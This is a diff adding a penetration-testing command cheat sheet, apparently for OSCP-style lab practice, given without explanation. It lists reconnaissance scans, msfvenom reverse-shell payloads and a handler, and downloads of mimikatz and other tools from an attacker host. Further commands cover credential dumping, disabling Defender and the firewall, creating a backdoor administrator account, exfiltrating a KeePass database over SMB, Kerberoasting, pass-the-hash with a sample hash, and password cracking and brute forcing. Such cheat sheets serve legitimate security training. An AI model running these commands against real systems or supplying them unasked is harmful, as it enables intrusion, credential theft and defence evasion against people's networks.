@@ -1,0 +1,95 @@
+sudo nmap -T4 -sS 192.168.000.000     -oN init-scan
+sudo nmap -T4 -sS 192.168.000.000 -p- -oN full-scan
+sudo nmap -T4 -sU 192.168.000.000     -oN udp-scan
+sudo nmap -A -O -T4 -sC -sV -Pn       -oN v-scan    192.168.000.000 -p 80,135,139,445,...
+proxychains -q nmap -T4 -sT -Pn 172.16.000.000 -p 21,22,80,443,445,1433,3389,5985,6379,8000,8080 | grep "open"
+proxychains -q nmap -T4 -sT -Pn 172.16.000.000 --top-ports 100 | grep "open"
+rustscan -a $h -t 3000 --ulimit 10000 -- -A -T4 -sC -sV -Pn -vv -oN rust-scan
+gobuster dir -k -u http://192.168.000.000 -w ~/secu/dict/SecLists/Discovery/Web-Content/big.txt -t 70
+gobuster dir -k -u http://192.168.000.000 -w ~/secu/dict/SecLists/Discovery/Web-Content/big.txt -d -t 70
+gobuster dir -k -u http://192.168.000.000 -w ~/secu/dict/SecLists/Discovery/Web-Content/big.txt -x asp,aspx,txt,html,doc,docx,pdf,config -t 70
+gobuster dir -k -u http://192.168.000.000 -w endpoints_sorted.txt --proxy http://127.0.0.1:8080
+ffuf -u http://192.168.000.000/FUZZ -w ~/secu/dict/SecLists/Discovery/Web-Content/quickhits.txt
+ffuf -u http://192.168.000.000/FUZZ -w ~/secu/dict/SecLists/Discovery/Web-Content/big.txt
+ffuf -u http://192.168.000.000/FUZZ -w ~/secu/dict/SecLists/Discovery/Web-Content/combined_directories.txt
+ffuf -u http://192.168.000.000/FUZZ -w ~/secu/dict/SecLists/Discovery/Web-Content/combined_words.txt -e .html,.php,.txt,.doc,.docx,.pdf,.config,.log
+
+
+xfreerdp /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /audio-mode:1 /tls-seclevel:0 \
++clipboard /size:1600x900 /u:user /p:'pass' /v:192.168.000.000:3389 /d:domain.com /drive:share,/tmp/hack
+xfreerdp3 /cert:ignore /bpp:8 /network:modem /compression -themes -wallpaper /audio-mode:1 /tls:seclevel:0 \
++clipboard /size:1600x900 /u:user /p:'pass' /v:192.168.000.000:3389 /d:domain.com /drive:share,/tmp/hack
+
+runas /user:mark cmd
+runas /netonly /user:oscp.exam\web_svc cmd
+sudo swaks -t user2@domain.com --from user1@domain.com --attach @config.Library-ms --server 192.168.000.000 --body @body.txt --header "Subject: Mail server breaks" --suppress-data -ap
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.000.000 LPORT=443 -f exe -o 443.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.000.000 LPORT=443 -f elf -o 443
+msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 192.168.000.000; set LPORT 443; run"
+iwr -uri http://192.168.000.000/443.exe -Outfile 443.exe
+iwr -uri http://192.168.000.000/mimikatz.exe -Outfile mimikatz.exe
+iwr -uri http://192.168.000.000/PowerView.ps1 -Outfile PowerView.ps1
+iwr -uri http://192.168.000.000/SharpHound.ps1 -Outfile SharpHound.ps1
+iwr -uri http://192.168.000.000/winPEASx64.exe -Outfile winPEASx64.exe
+iwr -uri http://192.168.000.000/chisel_win.exe -Outfile chisel_win.exe
+iwr -uri http://192.168.000.000/incognito.exe -Outfile incognito.exe
+./chisel_lin server --port 9090 --reverse
+.\chisel_win.exe client 192.168.000.000:9090 R:socks
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\jim\
+privilege::debug / token::elevate / lsadump::sam / sekurlsa::logonpasswords / sekurlsa::tickets /export
+.\incognito.exe list_tokens -u
+.\incognito.exe execute -c "NT AUTHORITY\SYSTEM" C:\Windows\system32\cmd.exe
+
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+netsh advfirewall set allprofiles state off
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+Set-MpPreference -DisableRealtimeMonitoring $true
+query user // logoff 1
+net user /add leopoldine Leopldine!123@
+net localgroup Administrators leopoldine /add
+get-netuser | select samaccountname
+
+impacket-smbserver share . -smb2support
+net view \\192.168.000.000
+copy Database.kdbx \\192.168.000.000\share
+sudo responder -I tun0
+
+smbclient -p 445 //192.168.000.000/SYSVOL -U domain.com/user --password=password
+proxychains -q crackmapexec smb 172.16.000.14-15 -u user       -p 'password' -d domain.com --shares
+proxychains -q crackmapexec smb 172.16.000.000   -u ./user.txt -p 'password' -d domain.com --continue-on-success
+proxychains -q impacket-psexec domain.com/user:'password'@172.16.000.000	# NT AUTH\SYSTEM
+proxychains -q impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc domain.com/user@172.16.000.000
+proxychains -q impacket-GetNPUsers  -request -dc-ip 172.16.000.000 domain.com/user
+proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.000.000 domain.com/user
+proxychains -q impacket-secretsdump -just-dc domain.com/user:'password'@172.16.000.000
+proxychains -q evil-winrm -i 172.16.000.000 -u user -p 'password'
+proxychains -q evil-winrm -i 172.16.000.000 -u user -H hash
+proxychains -q impacket-mssqlclient -windows-auth domain.com/user:'password'@172.16.000.000
+
+unshadow passwd shadow > shadow.hash
+john --wordlist=~/secu/dict/rockyou.txt shadow.hash
+hashcat -m 1800  shadow.hash   ~/secu/dict/rockyou.txt --force
+hashcat -m 0     md5.hash      ~/secu/dict/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+hashcat -m 0     md5.hash      ~/secu/dict/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000  sam.hash      ~/secu/dict/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 5600  ntlmv2.hash   ~/secu/dict/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 13400 keepass.hash  ~/secu/dict/rockyou.txt --force
+hashcat -m 18200 asrep.hash    ~/secu/dict/rockyou.txt --force
+hashcat -m 13100 kerb.hash     ~/secu/dict/rockyou.txt --force
+hashcat -m 3200  bcrypt.hash   ~/secu/dict/rockyou.txt --force
+hydra -f -L user.txt -P pass.txt ftp://192.168.243.247:21 -t 8 -I -v
+
+
+
+
+
+
+
+
+
+
+
